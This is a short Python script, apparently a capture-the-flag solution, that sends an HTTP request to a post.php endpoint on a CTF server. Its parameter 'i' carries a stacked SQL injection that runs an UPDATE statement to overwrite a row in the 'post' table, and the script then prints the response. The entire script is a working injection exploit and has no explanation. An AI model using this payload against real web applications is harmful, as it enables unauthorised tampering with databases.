import requests

url = "http://ctf.ukmpcc.org:32967"

s = requests.Session()

r = s.get(
    f"{url}/post.php",
    params={"i": "11; UPDATE post SET konten = 'Injected content' WHERE id = 1 --"},
)
print(r.text)
